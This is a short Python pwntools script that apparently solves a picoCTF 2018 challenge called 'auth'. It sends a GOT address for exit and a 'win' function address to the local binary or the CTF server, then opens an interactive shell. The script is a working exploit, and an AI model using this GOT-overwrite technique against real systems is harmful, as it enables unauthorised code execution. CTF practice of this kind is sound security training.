
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'

def info(s):
	log.info(s)


def exploit(r):

	r.readline()
	r.sendline("0x0804a014") # EXIT GOT address

	r.readline()
	r.sendline("0x0804854b") # Win address

	r.readuntil("...")
	r.interactive()
	return


if __name__ == '__main__':
    
	# e = ELF('.//auth')
	HOST , PORT = "2018shell2.picoctf.com",54664
	if len(sys.argv) > 1:
		r = remote(HOST,PORT)
		exploit(r)
	else:
		r = process(['./auth'])
		print util.proc.pidof(r)
		pause()
		exploit(r)
        
